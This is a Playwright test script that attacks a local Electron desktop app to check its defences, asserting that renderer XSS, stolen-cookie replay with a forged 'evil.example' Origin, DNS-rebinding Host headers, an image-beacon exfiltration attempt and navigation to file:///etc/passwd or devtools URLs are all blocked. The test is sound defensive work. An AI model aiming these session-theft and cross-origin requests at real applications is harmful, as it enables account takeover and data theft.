import { _electron as electron } from "playwright-core";
import { cpSync, mkdirSync, renameSync, rmSync, readFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import http from "node:http";

const here = dirname(fileURLToPath(import.meta.url));
const repo = resolve(here, "../..");
const work = process.env.KK_WORK ?? join(repo, "target/desktop-attack-tmp");
rmSync(work, { recursive: true, force: true });
const root = join(work, "root");
const project = join(root, "payments-service");
mkdirSync(root, { recursive: true });
cpSync(join(repo, "fixtures/synthetic-repo"), project, { recursive: true });
renameSync(join(project, "_env"), join(project, ".env"));
const data = join(work, "data");
mkdirSync(data, { recursive: true });
const results = [];
const check = (name, ok, detail = "") => {
  results.push(ok);
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? "  " + detail : ""}`);
};
const rawHttp = (port, { method = "GET", path = "/", headers = {}, body = null }) =>
  new Promise((res) => {
    const r = http.request({ host: "127.0.0.1", port, method, path, headers, setHost: false }, (m) => {
      let b = "";
      m.on("data", (c) => (b += c));
      m.on("end", () => res({ status: m.statusCode, headers: m.headers, body: b }));
    });
    r.on("error", (e) => res({ status: 0, error: String(e) }));
    if (body) r.write(body);
    r.end();
  });

const app = await electron.launch({
  executablePath: process.env.ELECTRON_BIN ?? join(repo, "apps/desktop/node_modules/electron/dist/Electron.app/Contents/MacOS/Electron"),
  args: [...(process.platform === "darwin" ? ["--use-mock-keychain"] : ["--password-store=basic"]), process.env.DESKTOP_APP_DIR ?? join(repo, "apps/desktop")],
  env: { ...process.env, KAKU_BIN: process.env.KAKU_BIN ?? join(repo, "target/debug/kaku"), KAKUREGA_DATA_DIR: data, KAKU_ARGS: `--root ${root} --scripted ${join(here, "script.json")} --ui-dir ${join(repo, "apps/web/dist")}` },
});
try {
  const page = await app.firstWindow();
  await page.getByRole("heading", { name: "Review a project" }).waitFor({ timeout: 30000 });
  // Record what the shell would hand to the user's browser, without opening anything on the owner's screen.
  await app.evaluate(({ shell }) => { globalThis.__external = []; shell.openExternal = async (u) => { globalThis.__external.push(String(u)); }; });
  const origin = new URL(page.url()).origin;
  const port = Number(new URL(origin).port);
  const admin = JSON.parse(readFileSync(join(data, "admin.json"), "utf8"));

  // renderer XSS: assume attacker script runs inside the page
  const xss = await page.evaluate(async () => {
    const out = {};
    out.cookie = document.cookie;
    out.storage = [Object.keys(localStorage).length, Object.keys(sessionStorage).length];
    out.adminList = (await fetch("/admin/approvals")).status;
    out.adminJobs = (await fetch("/admin/jobs", { method: "POST", headers: { "content-type": "application/json" }, body: "{}" })).status;
    out.approverEnroll = (await fetch("/admin/approvers", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ public_key: "x", label: "evil" }) })).status;
    out.logExport = (await fetch("/admin/log")).status;
    const s = document.createElement("script");
    s.textContent = "window.__injected = 1";
    document.head.appendChild(s);
    out.inlineScript = window.__injected === 1 ? "ran" : "blocked";
    try { out.evalWorks = String(eval("1+1")); } catch (e) { out.evalWorks = "blocked"; }
    try { out.fn = String(new Function("return 7")()); } catch (e) { out.fn = "blocked"; }
    const img = new Image();
    out.exfil = await new Promise((r) => { img.onload = () => r("loaded"); img.onerror = () => r("blocked"); img.src = "http://127.0.0.1:1/x.png"; });
    out.remoteScript = await new Promise((r) => { const sc = document.createElement("script"); sc.src = "https://example.com/x.js"; sc.onload = () => r("loaded"); sc.onerror = () => r("blocked"); document.head.appendChild(sc); });
    out.cross = await fetch("https://example.com/", { mode: "no-cors" }).then(() => "sent", () => "blocked");
    return out;
  });
  check("XSS cannot read the session: the cookie is HttpOnly so document.cookie is empty and storage holds nothing", xss.cookie === "" && xss.storage.every((n) => n === 0), JSON.stringify([xss.cookie, xss.storage]));
  check("XSS cannot reach any admin endpoint (list approvals, start jobs, enrol an approver, export the log)", [xss.adminList, xss.adminJobs, xss.approverEnroll, xss.logExport].every((c) => c === 401 || c === 403), JSON.stringify([xss.adminList, xss.adminJobs, xss.approverEnroll, xss.logExport]));
  check("CSP blocks inline scripts, eval and Function in the page", xss.inlineScript === "blocked" && xss.evalWorks === "blocked" && xss.fn === "blocked", JSON.stringify([xss.inlineScript, xss.evalWorks, xss.fn]));
  check("CSP blocks a remote script and an image beacon to another origin; no-cors fetch to another site is blocked", xss.remoteScript === "blocked" && xss.exfil === "blocked" && xss.cross === "blocked", JSON.stringify([xss.remoteScript, xss.exfil, xss.cross]));

  // cookie attributes in the real Electron session
  const cookies = await app.evaluate(async ({ session }) => (await session.defaultSession.cookies.get({})).map((c) => ({ name: c.name, httpOnly: c.httpOnly, sameSite: c.sameSite })));
  check("every cookie is HttpOnly and SameSite=Strict", cookies.length > 0 && cookies.every((c) => c.httpOnly && c.sameSite === "strict"), JSON.stringify([...new Set(cookies.map((c) => c.name))]) + " x" + cookies.length);
  const cookieValue = await app.evaluate(async ({ session }) => (await session.defaultSession.cookies.get({}))[0]?.value ?? "");

  // stolen session token used from another origin, another site, DNS rebinding hostnames
  const cookieName = await app.evaluate(async ({ session }) => (await session.defaultSession.cookies.get({}))[0]?.name ?? "");
  const withCookie = { cookie: `${cookieName}=${cookieValue}` };
  const base = { host: `127.0.0.1:${port}` };
  const ok = await rawHttp(port, { path: "/api/session", headers: { ...base, ...withCookie } });
  check("control: the cookie works from the same host with no Origin header (a same-user local process with the cookie is not covered by the browser protections)", ok.status === 200, String(ok.status));
  const evilOrigin = await rawHttp(port, { path: "/api/jobs", method: "POST", headers: { ...base, ...withCookie, origin: "http://evil.example", "content-type": "application/json" }, body: "{}" });
  const crossSite = await rawHttp(port, { path: "/api/jobs", method: "POST", headers: { ...base, ...withCookie, "sec-fetch-site": "cross-site", "content-type": "application/json" }, body: "{}" });
  const rebound = await rawHttp(port, { path: "/api/session", headers: { host: `evil.example:${port}`, ...withCookie } });
  const rebound2 = await rawHttp(port, { path: "/api/session", headers: { host: `127.0.0.1.evil.example:${port}`, ...withCookie } });
  const noHost = await rawHttp(port, { path: "/api/session", headers: { ...withCookie, host: "" } });
  check("a stolen cookie is refused with a foreign Origin, a cross-site fetch, and DNS-rebinding Host names", [evilOrigin.status, crossSite.status, rebound.status, rebound2.status].every((c) => c >= 400), JSON.stringify([evilOrigin.status, crossSite.status, rebound.status, rebound2.status, noHost.status]));
  const adminCookie = await rawHttp(port, { path: "/admin/approvals", headers: { ...base, ...withCookie } });
  check("the session cookie never opens an admin endpoint", adminCookie.status === 401 || adminCookie.status === 403, String(adminCookie.status));
  const adminTokenWithOrigin = await rawHttp(port, { path: "/admin/approvals", headers: { ...base, authorization: `Bearer ${admin.token}`, origin: origin } });
  check("even the real admin token is refused when the request carries a browser Origin", adminTokenWithOrigin.status === 401 || adminTokenWithOrigin.status === 403, String(adminTokenWithOrigin.status));
  const preflight = await rawHttp(port, { method: "OPTIONS", path: "/api/jobs", headers: { ...base, origin: "http://evil.example", "access-control-request-method": "POST" } });
  check("no CORS permission is ever granted to another origin", !preflight.headers?.["access-control-allow-origin"], JSON.stringify(preflight.headers?.["access-control-allow-origin"] ?? null));
  const headers = (await rawHttp(port, { path: "/", headers: base })).headers;
  check("the page is served with CSP, no-sniff and frame protection", /default-src 'none'/.test(headers["content-security-policy"] ?? "") && headers["x-content-type-options"] === "nosniff" && /frame-ancestors 'none'|deny/i.test((headers["content-security-policy"] ?? "") + (headers["x-frame-options"] ?? "")), JSON.stringify([headers["content-security-policy"]?.slice(0, 80), headers["x-content-type-options"], headers["x-frame-options"]]));

  // IPC spoofing and the main process surface
  const surface = await app.evaluate(({ ipcMain, app: a, BrowserWindow }) => ({
    ipcChannels: [...ipcMain.eventNames()].map(String).filter((n) => n !== "error"),
    isDefaultProtocol: a.isDefaultProtocolClient("kakurega"),
    windows: BrowserWindow.getAllWindows().length,
  }));
  check("the main process registers no IPC channels for a compromised page to call", surface.ipcChannels.length === 0, JSON.stringify(surface.ipcChannels));
  check("a page-side ipcRenderer, require, process, electron bridge and preload globals do not exist", await page.evaluate(() => [typeof require, typeof process, typeof window.electron, typeof window.ipcRenderer, typeof window.api, typeof window.kakurega].every((t) => t === "undefined")));
  const mainSrc = readFileSync(join(process.env.DESKTOP_APP_DIR ?? join(repo, "apps/desktop"), "src/main.mjs"), "utf8");
  check("the shell source sets no debugging or inspect switches, and registers no URL scheme (the test harness itself adds an inspector, so the live switch is not asserted)", !/remote-debugging|--inspect|appendSwitch|setAsDefaultProtocolClient/.test(mainSrc) && !surface.isDefaultProtocol, JSON.stringify(surface));

  // navigation and window attacks
  const nav = [];
  for (const url of ["file:///etc/passwd", "https://example.com/", "http://127.0.0.1:9/", "javascript:alert(1)", "data:text/html,<script>1</script>", "about:blank", "blob:http://x/y", "view-source:" + origin + "/", "chrome://gpu", "devtools://devtools/bundled/inspector.html"]) {
    await page.evaluate((u) => { try { location.href = u; } catch (e) {} }, url).catch(() => {});
    await new Promise((r) => setTimeout(r, 1200));
    const stayed = new URL(page.url()).origin === origin;
    nav.push([url.slice(0, 24), stayed]);
    if (!stayed) await page.goto(origin + "/").catch(() => {});
  }
  check("navigating the window to file, http(s) elsewhere, javascript, data, blob, view-source, chrome and devtools URLs is refused", nav.every(([, stay]) => stay), JSON.stringify(nav.filter(([, s]) => !s)));
  const opens = await page.evaluate(() => [window.open("https://example.com/"), window.open("file:///etc/passwd"), window.open("javascript:1"), window.open(location.origin + "/")].map((w) => w === null));
  await new Promise((r) => setTimeout(r, 600));
  check("window.open creates no window for any target (including the app's own origin)", opens.every(Boolean) && app.windows().length === 1, JSON.stringify([opens, app.windows().length]));
  const frames = await page.evaluate(async () => {
    const f = document.createElement("iframe");
    f.src = "https://example.com/";
    document.body.appendChild(f);
    await new Promise((r) => setTimeout(r, 800));
    let blocked = false;
    try { blocked = f.contentWindow.location.href === undefined; } catch { blocked = true; }
    const g = document.createElement("iframe");
    g.src = location.origin + "/";
    document.body.appendChild(g);
    return blocked;
  });
  check("a foreign iframe cannot be read and the app cannot be framed by itself or others to attack it", frames === true);
  const drop = await page.evaluate(() => { const dt = new DataTransfer(); dt.items.add(new File(["x"], "x.html")); const e = new DragEvent("drop", { dataTransfer: dt, bubbles: true, cancelable: true }); document.body.dispatchEvent(e); return location.origin; });
  check("dropping a file on the window does not navigate it", drop === origin && new URL(page.url()).origin === origin);
  const external = await app.evaluate(() => globalThis.__external);
  check("the only things the shell would open in the owner's browser are plain https links without credentials", external.every((u) => /^https:\/\/[^@/]+\//.test(u)), JSON.stringify(external));
  check("the window is still the app after all of the above", new URL(page.url()).origin === origin && (await page.getByRole("heading", { name: "Review a project" }).count()) === 1);
} finally {
  await app.close();
}
const bad = results.filter((r) => !r).length;
console.log(bad === 0 ? `\nall ${results.length} desktop attack checks passed` : `\n${bad} FAILED`);
process.exit(bad === 0 ? 0 : 1);
